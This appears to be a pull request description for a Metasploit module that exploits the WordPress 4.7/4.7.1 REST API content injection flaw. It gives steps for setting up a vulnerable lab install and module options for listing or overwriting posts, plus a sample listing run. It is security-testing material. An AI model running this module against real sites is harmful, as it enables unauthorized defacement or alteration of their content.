**Feature description:**

This adds a module for the WordPress [4.7](https://wordpress.org/wordpress-4.7.tar.gz)/[4.7.1](https://wordpress.org/wordpress-4.7.1.tar.gz)
content injection vulnerability detailed at
https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html.

**Verification steps:**

- [ ] Download https://wordpress.org/wordpress-4.7.1.tar.gz
- [ ] `tar xf wordpress-4.7.1.tar.gz -C /var/www/html --no-same-owner`
- [ ] Prevent auto-update with either:
    1. [ ] Ensure the install dir is not writable by the web user
    2. [ ] Add the following to `wp_config.php` (after install)
    ```
    define( 'WP_AUTO_UPDATE_CORE', false );
    define( 'AUTOMATIC_UPDATER_DISABLED', true );
    ```
- [ ] Install Wordpress
- [ ] Start `msfconsole`
- [ ] `use auxiliary/scanner/http/wordpress_content_injection`
- [ ] Set `rhost`, `rport` and `TARGETURI`
- [ ] Set `ACTION` to either `LIST` or `UPDATE`
- [ ] Set `POST_ID` and `POST_TITLE`, `POST_CONTENT`, and/or `POST_PASSWORD`
- [ ] Run the module

**Sample run:**

This is just the `LIST` action...

```
msf auxiliary(wordpress_content_injection) > run

[*] REST API found in HTML document
Posts at https://[redacted]:443/ (REST API: /wp-json/wp/v2)
============================================================

ID  Title         URL                                        Password
--  -----         ---                                        --------
1   Hello world!  https://[redacted]/2016/10/hello-world/    No
87  Hello world!  https://[redacted]/2016/08/hello-world-2/  No

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wordpress_content_injection) >
```
